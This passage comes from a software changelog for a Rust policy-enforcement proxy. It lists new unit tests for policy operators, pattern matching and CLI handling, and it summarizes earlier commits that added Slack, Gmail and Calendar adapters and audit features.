  `not_equals` / `in` / `not_in` / `matches` / `greater_than` /
  `less_than`), every combinator (`all` / `any` / `not` /
  `exists`), the top-level AND semantics, missing-field
  asymmetries, regex error paths, and four shape-error branches.
  `decision.rs` gets 9 new tests pinning `Pattern::is_match`
  (literal case-sensitivity, regex anchors + alternation) and the
  `Decision` enum's snake_case wire-format contract.
- New test surfaces from prior commits: `policy_handle`
  comment-preservation (4 tests), CLI `policy edit` shell-quote +
  local-validation (5 tests), `blocked::canonical_request_json`
  shape + default-deny + truncation + determinism (4 tests),
  `api::notifier` test-driver classification + `TestRequest`
  deserialization (2 tests).

---

## Prior history

Pre-`Unreleased` commits are summarized in the git log
(`git log --oneline`). Highlights of the immediate predecessor
batches:

- **`3a83449`** — Slack `user_map`, Block-Kit `[Why?]` button,
  Calendar `calendarList`, full §3.2 metric contract, CLI
  completion, OAuth client registry.
- **`9195f9a`** — comprehensive policy eval, per-policy email
  routing + escalation, `last_used_at` debounce, flush-loop
  hot-swap, `calendar.events.delete`.
- **`463953e`** — Config TOML file loader, PolicyTrace adapter
  wiring, audit schema doc, actions purge.
- **`b7d618b`** — `ErrorCode`/`PolicyTrace`, `PolicyLoader`,
  `ConfigBuilder`, coverage gate, CLI scopes+simulate, Slack
  trigger_id idempotency, notifier burst+details_url, SMTP retry,
  Grafana four-quadrant, expiry sweeper, kill-cache, email cc/bcc,
  SIEM batch.
- **`8573dcf`** — M3 + M4 + `ui-less-surfaces.md` spec items:
  notifier matrix, audit + policy hot reload, signed-URL approval,
  operator tokens.
- **`16ba2bf`** — Step 2.3 + 3.2 + 2.4: override loop, killswitch,
  audit-mode enforcement.
- **`f0b3345`** — Gmail adapter, list-valued ops expansion,
  Cloudflare Workers config.

---

[Unreleased]: https://github.com/clay-good/proxilion/compare/d69a804...HEAD
